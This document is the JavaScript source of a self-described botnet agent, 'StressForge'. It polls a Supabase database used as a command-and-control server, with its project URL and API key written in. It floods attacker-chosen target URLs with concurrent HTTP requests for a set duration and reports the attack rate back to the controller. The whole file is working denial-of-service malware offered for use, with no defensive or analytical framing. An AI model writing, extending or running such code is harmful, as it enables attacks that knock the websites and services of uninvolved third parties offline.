/**
 * STRESSFORGE BOTNET AGENT V3.0 (ROBUST)
 * - Fixed URL Parsing
 * - Supports POST/PUT/Headers
 * - JSON Body Support
 */
const https = require('https');
const http = require('http');

// --- CONFIG ---
const SUPABASE_URL = "https://qbedywgbdwxaucimgiok.supabase.co";
const SUPABASE_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InFiZWR5d2diZHd4YXVjaW1naW9rIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjQ3NDA5ODEsImV4cCI6MjA4MDMxNjk4MX0.Lz0x7iKy2UcQ3jdN4AdjSIYYISBfn233C9qT_8y8jFo";

// --- RENDER KEEP-ALIVE ---
const PORT = process.env.PORT || 3000;
http.createServer((req, res) => { res.writeHead(200); res.end('StressForge Agent Active'); })
    .listen(PORT, () => console.log(`[SYSTEM] Agent listening on port ${PORT}`));

// --- HELPER: ROBUST REQUEST ---
const supabaseRequest = (method, pathStr, body = null) => {
    return new Promise((resolve, reject) => {
        try {
            // Robust URL parsing to handle trailing slashes in SUPABASE_URL
            const baseUrl = new URL(SUPABASE_URL);
            const apiPath = '/rest/v1' + (pathStr.startsWith('/') ? pathStr : '/' + pathStr);
            
            const options = {
                hostname: baseUrl.hostname,
                path: apiPath,
                method: method,
                headers: {
                    'apikey': SUPABASE_KEY,
                    'Authorization': `Bearer ${SUPABASE_KEY}`,
                    'Content-Type': 'application/json',
                    'Prefer': 'return=representation'
                }
            };
            const req = https.request(options, (res) => {
                let data = '';
                res.on('data', chunk => data += chunk);
                res.on('end', () => {
                    try {
                        // Handle empty responses (204)
                        resolve(data ? JSON.parse(data) : null);
                    } catch(e) { resolve(null); }
                });
            });
            req.on('error', (e) => { console.error('Supabase Req Error:', e.message); reject(e); });
            if (body) req.write(JSON.stringify(body));
            req.end();
        } catch(e) { reject(e); }
    });
};

console.log('\x1b[36m[AGENT] Initialized V3. Polling C2...\x1b[0m');

let activeJob = null;
let activeLoop = null;

const startAttack = (job) => {
    if (activeJob) return;
    activeJob = job;
    console.log(`\x1b[33m[ATTACK] ${job.method || 'GET'} ${job.target} | Threads: ${job.concurrency}\x1b[0m`);
    
    let running = true;
    let totalRequests = 0;
    const startTime = Date.now();
    
    const agent = new https.Agent({ keepAlive: true, maxSockets: 5000 });
    let targetUrl;
    try { targetUrl = new URL(job.target); } catch(e) { console.error('Invalid Target URL'); return; }
    
    const requestLib = targetUrl.protocol === 'https:' ? https : http;
    const reqOptions = {
        agent,
        method: job.method || 'GET',
        headers: job.headers || {},
    };
    // Ensure Host header is set
    reqOptions.headers['Host'] = targetUrl.host;
    reqOptions.headers['Cache-Control'] = 'no-cache';

    const flood = () => {
        if (!running) return;
        const req = requestLib.request(job.target, reqOptions, (res) => {
            res.resume(); 
            totalRequests++;
            flood();
        });
        req.on('error', () => { totalRequests++; flood(); });
        
        // Handle Body
        if (job.body && ['POST','PUT','PATCH'].includes(job.method)) {
             try {
                // If body is JSON string, write it
                req.write(typeof job.body === 'string' ? job.body : JSON.stringify(job.body));
             } catch(e) {}
        }
        req.end();
    };

    for(let i=0; i<job.concurrency; i++) flood();

    activeLoop = setInterval(async () => {
        const elapsed = (Date.now() - startTime) / 1000;
        const rps = Math.floor(totalRequests / elapsed);
        
        try {
             await supabaseRequest('PATCH', `/jobs?id=eq.${job.id}`, { current_rps: rps });
        } catch(e) {}

        if (elapsed >= job.duration) {
            running = false;
            clearInterval(activeLoop);
            activeJob = null;
            await supabaseRequest('PATCH', `/jobs?id=eq.${job.id}`, { status: 'COMPLETED', logs: 'Finished' });
            console.log('[COMPLETE] Attack finished.');
        }
    }, 2000);
};

// Poll every 3s
setInterval(async () => {
    if (activeJob) return;
    try {
        // Fetch 1 pending job
        const jobs = await supabaseRequest('GET', '/jobs?status=eq.PENDING&limit=1');
        if (jobs && jobs.length > 0) {
            const job = jobs[0];
            console.log('Received Job:', job.id);
            await supabaseRequest('PATCH', `/jobs?id=eq.${job.id}`, { status: 'RUNNING' });
            startAttack(job);
        }
    } catch (e) { console.log('Poll Error:', e.message); }
}, 3000);
